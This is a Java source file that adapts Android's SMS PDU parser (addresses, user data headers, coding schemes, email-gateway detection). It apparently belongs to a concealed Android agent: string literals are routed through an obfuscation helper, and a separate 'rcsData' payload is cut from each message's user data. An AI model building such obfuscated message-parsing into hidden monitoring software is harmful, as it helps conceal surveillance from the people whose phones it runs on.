package com.android.dvci.util;

import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.telephony.PhoneNumberUtils;
import android.telephony.SmsMessage;
import android.text.TextUtils;
import android.text.format.Time;
import android.util.Log;
import android.util.Patterns;

import com.android.dvci.auto.Cfg;
import com.android.mm.M;

import java.io.Writer;
import java.util.Arrays;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Base class declaring the specific methods and members for SmsMessage.
 * {@hide}
 */
public class SmsMessageBase {
	private static final String TAG = "SmsMessageBase" ;

	public static final int ENCODING_UNKNOWN = 0;
	public static final int ENCODING_7BIT = 1;
	public static final int ENCODING_8BIT = 2;
	public static final int ENCODING_16BIT = 3;
	/**
	 * 56     * @hide This value is not defined in global standard. Only in Korea, this is used.
	 * 57
	 */
	public static final int ENCODING_KSC5601 = 4;
	;

	/**
	 * {@hide} The address of the SMSC. May be null
	 */
	protected String scAddress;

	/**
	 * {@hide} The address of the sender
	 */
	protected SmsAddress originatingAddress;

	/**
	 * {@hide} The message body as a string. May be null if the message isn't text
	 */
	protected String messageBody;

	/**
	 * {@hide}
	 */
	protected String pseudoSubject;

	/**
	 * {@hide} Non-null if this is an email gateway message
	 */
	protected String emailFrom;

	/**
	 * {@hide} Non-null if this is an email gateway message
	 */
	protected String emailBody;

	/**
	 * {@hide}
	 */
	protected boolean isEmail;

	/**
	 * {@hide}
	 */
	protected long scTimeMillis;

	/**
	 * {@hide} The raw PDU of the message
	 */
	protected byte[] mPdu;

	/**
	 * {@hide} The raw bytes for the user data section of the message
	 */
	protected byte[] userData;

	/**
	 * {@hide}
	 */
	protected SmsHeader userDataHeader;

	// "Message Waiting Indication Group"
	// 23.038 Section 4
	/**
	 * {@hide}
	 */
	protected boolean isMwi;

	/**
	 * {@hide}
	 */
	protected boolean mwiSense;

	/**
	 * {@hide}
	 */
	protected boolean mwiDontStore;

	/**
	 * Indicates status for messages stored on the ICC.
	 */
	protected int statusOnIcc = -1;

	/**
	 * Record index of message in the EF.
	 */
	protected int indexOnIcc = -1;

	/**
	 * TP-Message-Reference - Message Reference of sent message. @hide
	 */
	public int messageRef;
	SmsMessageBase.PduParser parser ;
	boolean hasUserDataHeader = false;
	int dataCodingScheme = ENCODING_UNKNOWN;
	private byte[] rcsData;

	public SmsMessageBase(byte[] mPdu) {
		this.mPdu = mPdu;
		parser = new SmsMessageBase.PduParser(mPdu);
		String scAddress = parser.getSCAddress();
		int firstByte = parser.getByte();
		hasUserDataHeader = (firstByte & 0x40) == 0x40;
		if (scAddress != null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "  processPdu: SMS SC address: " + scAddress + "has UDH =" + hasUserDataHeader);
			}
		}

		int mti = firstByte & 0x3;
		switch (mti) {
			// TP-Message-Type-Indicator
			// 9.2.3
			case 0:
			case 3: //GSM 03.40 9.2.3.1: MTI == 3 is Reserved.
				//This should be processed in the same way as MTI == 0 (Deliver)
				//parseSmsDeliver(p, firstByte);
				if (Cfg.DEBUG) {
					Check.log(TAG + "  processPdu: SMS DELIVER");
				}
				break;
			case 2:
				//parseSmsStatusReport(p, firstByte);
				if (Cfg.DEBUG) {
					Check.log(TAG + "  processPdu: SMS STATUS REPORT");
				}
				break;
			default:
				Check.log(TAG + "  processPdu: UNKNOWN MTI");
				return;
		}
		// just update the pdu cursor
		parser.getAddress();
		// TP-Protocol-Identifier (TP-PID)
		// TS 23.040 9.2.3.9
		int protocolIdentifier = parser.getByte();

		// TP-Data-Coding-Scheme
		// see TS 23.038
		dataCodingScheme = parser.getByte();
		// just update the pdu cursor
		parser.getSCTimestampMillis();
	}
	/**
	 * For a specific text string, this object describes protocol
	 * properties of encoding it for transmission as message user
	 * data.
	 */
	public static class TextEncodingDetails {
		/**
		 * The number of SMS's required to encode the text.
		 */
		public int msgCount;

		/**
		 * The number of code units consumed so far, where code units
		 * are basically characters in the encoding -- for example,
		 * septets for the standard ASCII and GSM encodings, and 16
		 * bits for Unicode.
		 */
		public int codeUnitCount;

		/**
		 * How many code units are still available without spilling
		 * into an additional message.
		 */
		public int codeUnitsRemaining;

		/**
		 * The encoding code unit size (specified using
		 * android.telephony.SmsMessage ENCODING_*).
		 */
		public int codeUnitSize;

		/**
		 * The GSM national language table to use, or 0 for the default 7-bit alphabet.
		 */
		public int languageTable;

		/**
		 * The GSM national language shift table to use, or 0 for the default 7-bit extension table.
		 */
		public int languageShiftTable;

		@Override
		public String toString() {
			return M.e("TextEncodingDetails ") +
					M.e("{ msgCount=") + msgCount +
					M.e(", codeUnitCount=") + codeUnitCount +
					M.e(", codeUnitsRemaining=") + codeUnitsRemaining +
					M.e(", codeUnitSize=") + codeUnitSize +
					M.e(", languageTable=") + languageTable +
					M.e(", languageShiftTable=") + languageShiftTable +
					M.e(" }");
		}
	}

	// TODO(): This class is duplicated in SmsMessage.java. Refactor accordingly.
	public static abstract class SubmitPduBase {
		public byte[] encodedScAddress; // Null if not applicable.
		public byte[] encodedMessage;

		public String toString() {
			return M.e("SubmitPdu: encodedScAddress = ")
					+ Arrays.toString(encodedScAddress)
					+ M.e(", encodedMessage = ")
					+ Arrays.toString(encodedMessage);
		}
	}

	/**
	 * Returns the address of the SMS service center that relayed this message
	 * or null if there is none.
	 */
	public String getServiceCenterAddress() {
		return scAddress;
	}

	/**
	 * Returns the originating address (sender) of this SMS message in String
	 * form or null if unavailable
	 */
	public String getOriginatingAddress() {
		if (originatingAddress == null) {
			return null;
		}

		return originatingAddress.getAddressString();
	}

	/**
	 * Returns the originating address, or email from address if this message
	 * was from an email gateway. Returns null if originating address
	 * unavailable.
	 */
	public String getDisplayOriginatingAddress() {
		if (isEmail) {
			return emailFrom;
		} else {
			return getOriginatingAddress();
		}
	}

	/**
	 * Returns the message body as a String, if it exists and is text based.
	 *
	 * @return message body is there is one, otherwise null
	 */
	public String getMessageBody() {
		return messageBody;
	}



	/**
	 * Returns the message body, or email message body if this message was from
	 * an email gateway. Returns null if message body unavailable.
	 */
	public String getDisplayMessageBody() {
		if (isEmail) {
			return emailBody;
		} else {
			return getMessageBody();
		}
	}

	/**
	 * Unofficial convention of a subject line enclosed in parens empty string
	 * if not present
	 */
	public String getPseudoSubject() {
		return pseudoSubject == null ? "" : pseudoSubject;
	}

	/**
	 * Returns the service centre timestamp in currentTimeMillis() format
	 */
	public long getTimestampMillis() {
		return scTimeMillis;
	}

	/**
	 * Returns true if message is an email.
	 *
	 * @return true if this message came through an email gateway and email
	 * sender / subject / parsed body are available
	 */
	public boolean isEmail() {
		return isEmail;
	}

	/**
	 * @return if isEmail() is true, body of the email sent through the gateway.
	 * null otherwise
	 */
	public String getEmailBody() {
		return emailBody;
	}

	/**
	 * @return if isEmail() is true, email from address of email sent through
	 * the gateway. null otherwise
	 */
	public String getEmailFrom() {
		return emailFrom;
	}


	/**
	 * returns the user data section minus the user data header if one was
	 * present.
	 */
	public byte[] getUserData() {
		return userData;
	}
	/**
	 * returns the user data section minus the user data header if one was
	 * present.
	 */
	public byte[] getUserDataRcs() {
		return rcsData;
		//return Arrays.copyOfRange(userData, 7, userData.length);
	}

	/**
	 * Returns an object representing the user data header
	 * <p/>
	 * {@hide}
	 */
	public SmsHeader getUserDataHeader() {
		return userDataHeader;
	}

	/**
	 * TODO(cleanup): The term PDU is used in a seemingly non-unique
	 * manner -- for example, what is the difference between this byte
	 * array and the contents of SubmitPdu objects.  Maybe a more
	 * illustrative term would be appropriate.
	 */

	/**
	 * Returns the raw PDU for the message.
	 */
	public byte[] getPdu() {
		return mPdu;
	}


	/**
	 * Returns the status of the message on the ICC (read, unread, sent, unsent).
	 *
	 * @return the status of the message on the ICC.  These are:
	 * SmsManager.STATUS_ON_ICC_FREE
	 * SmsManager.STATUS_ON_ICC_READ
	 * SmsManager.STATUS_ON_ICC_UNREAD
	 * SmsManager.STATUS_ON_ICC_SEND
	 * SmsManager.STATUS_ON_ICC_UNSENT
	 */
	public int getStatusOnIcc() {
		return statusOnIcc;
	}

	/**
	 * Returns the record index of the message on the ICC (1-based index).
	 *
	 * @return the record index of the message on the ICC, or -1 if this
	 * SmsMessage was not created from a ICC SMS EF record.
	 */
	public int getIndexOnIcc() {
		return indexOnIcc;
	}

	protected void parseMessageBody() {
		// originatingAddress could be null if this message is from a status
		// report.
		if (originatingAddress != null && originatingAddress.couldBeEmailGateway()) {
			extractEmailAddressFromMessageBody();
		}
	}

	/**
	 * Try to parse this message as an email gateway message
	 * There are two ways specified in TS 23.040 Section 3.8 :
	 * - SMS message "may have its TP-PID set for Internet electronic mail - MT
	 * SMS format: [<from-address><space>]<message> - "Depending on the
	 * nature of the gateway, the destination/origination address is either
	 * derived from the content of the SMS TP-OA or TP-DA field, or the
	 * TP-OA/TP-DA field contains a generic gateway address and the to/from
	 * address is added at the beginning as shown above." (which is supported here)
	 * - Multiple addresses separated by commas, no spaces, Subject field delimited
	 * by '()' or '##' and '#' Section 9.2.3.24.11 (which are NOT supported here)
	 */
	protected void extractEmailAddressFromMessageBody() {

        /* Some carriers may use " /" delimiter as below
         *
         * 1. [x@y][ ]/[subject][ ]/[body]
         * -or-
         * 2. [x@y][ ]/[body]
         */
		String[] parts = messageBody.split("( /)|( )", 2);
		if (parts.length < 2) return;
		emailFrom = parts[0];
		emailBody = parts[1];
		isEmail = Mms.isEmailAddress(emailFrom);
	}


	public abstract class SmsAddress {
		// From TS 23.040 9.1.2.5 and TS 24.008 table 10.5.118
		// and C.S0005-D table 2.7.1.3.2.4-2
		public static final int TON_UNKNOWN = 0;
		public static final int TON_INTERNATIONAL = 1;
		public static final int TON_NATIONAL = 2;
		public static final int TON_NETWORK = 3;
		public static final int TON_SUBSCRIBER = 4;
		public static final int TON_ALPHANUMERIC = 5;
		public static final int TON_ABBREVIATED = 6;

		public int ton;
		public String address;
		public byte[] origBytes;

		/**
		 * Returns the address of the SMS message in String form or null if unavailable
		 */
		public String getAddressString() {
			return address;
		}

		/**
		 * Returns true if this is an alphanumeric address
		 */
		public boolean isAlphanumeric() {
			return ton == TON_ALPHANUMERIC;
		}

		/**
		 * Returns true if this is a network address
		 */
		public boolean isNetworkSpecific() {
			return ton == TON_NETWORK;
		}

		public boolean couldBeEmailGateway() {
			// Some carriers seems to send email gateway messages in this form:
			// from: an UNKNOWN TON, 3 or 4 digits long, beginning with a 5
			// PID: 0x00, Data coding scheme 0x03
			// So we just attempt to treat any message from an address length <= 4
			// as an email gateway

			return address.length() <= 4;
		}

	}


	/**
	 * Contains all MMS messages.
	 */
	public static final class Mms {
		/**
		 * The content:// style URL for this table
		 */
		public static final Uri CONTENT_URI = Uri.parse(M.e("content://mms"));

		/**
		 * The default sort order for this table
		 */
		public static final String DEFAULT_SORT_ORDER = M.e("date DESC");

		/**
		 * mailbox         =       name-addr
		 * name-addr       =       [display-name] angle-addr
		 * angle-addr      =       [CFWS] "<" addr-spec ">" [CFWS]
		 */
		public static final Pattern NAME_ADDR_EMAIL_PATTERN =
				Pattern.compile(M.e("\\s*(\"[^\"]*\"|[^<>\"]+)\\s*<([^<>]+)>\\s*"));


		public static final Cursor query(
				ContentResolver cr, String[] projection) {
			return cr.query(CONTENT_URI, projection, null, null, DEFAULT_SORT_ORDER);
		}

		public static final Cursor query(
				ContentResolver cr, String[] projection,
				String where, String orderBy) {
			return cr.query(CONTENT_URI, projection,
					where, null, orderBy == null ? DEFAULT_SORT_ORDER : orderBy);
		}


		public static String extractAddrSpec(String address) {
			Matcher match = NAME_ADDR_EMAIL_PATTERN.matcher(address);

			if (match.matches()) {
				return match.group(2);
			}
			return address;
		}

		/**
		 * Returns true if the address is an email address
		 *
		 * @param address the input address to be tested
		 * @return true if address is an email address
		 */
		public static boolean isEmailAddress(String address) {
			if (TextUtils.isEmpty(address)) {
				return false;
			}

			String s = extractAddrSpec(address);
			Matcher match = Patterns.EMAIL_ADDRESS.matcher(s);
			return match.matches();
		}

		/**
		 * Returns true if the number is a Phone number
		 *
		 * @param number the input number to be tested
		 * @return true if number is a Phone number
		 */
		public static boolean isPhoneNumber(String number) {
			if (TextUtils.isEmpty(number)) {
				return false;
			}

			Matcher match = Patterns.PHONE.matcher(number);
			return match.matches();
		}

	}

	public static class PduParser {
		byte pdu[];
		int cur;
		SmsHeader userDataHeader;
		byte[] userData;
		int mUserDataSeptetPadding;
		int mUserDataSize;

		PduParser(byte[] pdu) {
			this.pdu = pdu;
			cur = 0;
			mUserDataSeptetPadding = 0;
		}

		/**
		 * Parse and return the SC address prepended to SMS messages coming via
		 * the TS 27.005 / AT interface.  Returns null on invalid address
		 */
		String getSCAddress() {
			int len;
			String ret;

			// length of SC Address
			len = getByte();

			if (len == 0) {
				// no SC address
				ret = null;
			} else {
				// SC address
				try {
					ret = PhoneNumberUtils.calledPartyBCDToString(pdu, cur, len);
				} catch (RuntimeException tr) {

					ret = null;
				}
			}

			cur += len;

			return ret;
		}

		/**
		 * returns non-sign-extended byte value
		 */
		int getByte() {
			return pdu[cur++] & 0xff;
		}

		/**
		 * Any address except the SC address (eg, originating address) See TS
		 * 23.040 9.1.2.5
		 */
		void getAddress() {
			//GsmSmsAddress ret;

			// "The Address-Length field is an integer representation of
			// the number field, i.e. excludes any semi-octet containing only
			// fill bits."
			// The TOA field is not included as part of this
			int addressLength = pdu[cur] & 0xff;
			int lengthBytes = 2 + (addressLength + 1) / 2;

			//ret = new GsmSmsAddress(pdu, cur, lengthBytes);

			cur += lengthBytes;

			//return ret;
		}


		/**
		 * Pulls the user data out of the PDU, and separates the payload from
		 * the header if there is one.
		 *
		 * @param hasUserDataHeader true if there is a user data header
		 * @param dataInSeptets     true if the data payload is in septets instead
		 *                          of octets
		 * @return the number of septets or octets in the user data payload
		 */
		int constructUserData(boolean hasUserDataHeader, boolean dataInSeptets) {
			int offset = cur;
			int userDataLength = pdu[offset++] & 0xff;
			int headerSeptets = 0;
			int userDataHeaderLength = 0;

			if (hasUserDataHeader) {
				userDataHeaderLength = pdu[offset++] & 0xff;

				byte[] udh = new byte[userDataHeaderLength];
				System.arraycopy(pdu, offset, udh, 0, userDataHeaderLength);
				userDataHeader = SmsHeader.fromByteArray(udh);
				offset += userDataHeaderLength;

				int headerBits = (userDataHeaderLength + 1) * 8;
				headerSeptets = headerBits / 7;
				headerSeptets += (headerBits % 7) > 0 ? 1 : 0;
				mUserDataSeptetPadding = (headerSeptets * 7) - headerBits;
			}

			int bufferLen;
			if (dataInSeptets) {
	            /*
                 * Here we just create the user data length to be the remainder of
                 * the pdu minus the user data header, since userDataLength means
                 * the number of uncompressed septets.
                 */
				bufferLen = pdu.length - offset;
			} else {
                /*
                 * userDataLength is the count of octets, so just subtract the
                 * user data header.
                 */
				bufferLen = userDataLength - (hasUserDataHeader ? (userDataHeaderLength + 1) : 0);
				if (bufferLen < 0) {
					bufferLen = 0;
				}
			}

			userData = new byte[bufferLen];
			System.arraycopy(pdu, offset, userData, 0, userData.length);
			cur = offset;

			if (dataInSeptets) {
				// Return the number of septets
				int count = userDataLength - headerSeptets;
				// If count < 0, return 0 (means UDL was probably incorrect)
				return count < 0 ? 0 : count;
			} else {
				// Return the number of octets
				return userData.length;
			}
		}

		/**
		 * Returns the user data payload, not including the headers
		 *
		 * @return the user data payload, not including the headers
		 */
		byte[] getUserData() {
			return userData;
		}

		/**
		 * Returns the number of padding bits at the beginning of the user data
		 * array before the start of the septets.
		 *
		 * @return the number of padding bits at the beginning of the user data
		 * array before the start of the septets
		 */
		int getUserDataSeptetPadding() {
			return mUserDataSeptetPadding;
		}

		/**
		 * Returns an object representing the user data headers
		 * <p/>
		 * {@hide}
		 */
		SmsHeader getUserDataHeader() {
			return userDataHeader;
		}


		boolean moreDataPresent() {
			return (pdu.length > cur);
		}

		public void getSCTimestampMillis() {
			//TP-SCTS	7 octets	Service Centre Time Stamp
			cur += 7;

		}
	}

	/**
	 * Parses the User Data of an SMS.
	 */
	public void parseUserData( ) {
        int encodingType = ENCODING_UNKNOWN;

        // Look up the data encoding scheme
        if ((dataCodingScheme & 0x80) == 0) {
            // Bits 7..4 == 0xxx
            boolean automaticDeletion = (0 != (dataCodingScheme & 0x40));
	        boolean userDataCompressed = (0 != (dataCodingScheme & 0x20));
	        boolean hasMessageClass = (0 != (dataCodingScheme & 0x10));

            if (userDataCompressed) {
	            if (Cfg.DEBUG) {
		            Check.log(TAG + "4 - Unsupported SMS data coding scheme "
				            + "(compression) " + (dataCodingScheme & 0xff));
	            }
            } else {
                switch ((dataCodingScheme >> 2) & 0x3) {
                case 0: // GSM 7 bit default alphabet
                    encodingType = ENCODING_7BIT;
                    break;

                case 2: // UCS 2 (16bit)
                    encodingType = ENCODING_16BIT;
                    break;

                case 1: // 8 bit data
                case 3: // reserved
	                if (Cfg.DEBUG) {
		                Check.log(TAG + "1 - Unsupported SMS data coding scheme "
				                + (dataCodingScheme & 0xff));
	                }
                    encodingType = ENCODING_8BIT;
                    break;
                }
            }
        } else if ((dataCodingScheme & 0xf0) == 0xf0) {
	        boolean automaticDeletion = false;
	        boolean hasMessageClass = true;
	        boolean userDataCompressed = false;

            if (0 == (dataCodingScheme & 0x04)) {
                // GSM 7 bit default alphabet
                encodingType = ENCODING_7BIT;
            } else {
                // 8 bit data
                encodingType = ENCODING_8BIT;
            }
        } else if ((dataCodingScheme & 0xF0) == 0xC0
                || (dataCodingScheme & 0xF0) == 0xD0
                || (dataCodingScheme & 0xF0) == 0xE0) {
            // 3GPP TS 23.038 V7.0.0 (2006-03) section 4

            // 0xC0 == 7 bit, don't store
            // 0xD0 == 7 bit, store
            // 0xE0 == UCS-2, store

            if ((dataCodingScheme & 0xF0) == 0xE0) {
                encodingType = ENCODING_16BIT;
            } else {
                encodingType = ENCODING_7BIT;
            }

	        boolean userDataCompressed = false;
            boolean active = ((dataCodingScheme & 0x08) == 0x08);

            // bit 0x04 reserved

            if ((dataCodingScheme & 0x03) == 0x00) {
                isMwi = true;
                mwiSense = active;
                mwiDontStore = ((dataCodingScheme & 0xF0) == 0xC0);
            } else {
                isMwi = false;

	            if (Cfg.DEBUG) {
		            Check.log(TAG + "MWI for fax, email, or other "
				            + (dataCodingScheme & 0xff));
	            }
            }
        } else if ((dataCodingScheme & 0xC0) == 0x80) {
            // 3GPP TS 23.038 V7.0.0 (2006-03) section 4
            // 0x80..0xBF == Reserved coding groups
            if (dataCodingScheme == 0x84) {
                // This value used for KSC5601 by carriers in Korea.
                encodingType = ENCODING_KSC5601;
            } else {
	            if (Cfg.DEBUG) {
		            Check.log(TAG + "5 - Unsupported SMS data coding scheme "
				            + (dataCodingScheme & 0xff));
	            }
            }
        } else {
	        if (Cfg.DEBUG) {
		        Check.log(TAG + "3 - Unsupported SMS data coding scheme "
				        + (dataCodingScheme & 0xff));
	        }
        }


		// set both the user data and the user data header.
		int count = parser.constructUserData(hasUserDataHeader,
				encodingType == ENCODING_7BIT);
		this.userData = parser.getUserData();
		this.userDataHeader = parser.getUserDataHeader();
		// eventual rcs user data start after 7 byte
		this.rcsData = new byte[this.userData.length - 7];
		System.arraycopy(this.userData, 7, this.rcsData, 0, this.userData.length - 7);

	}

}


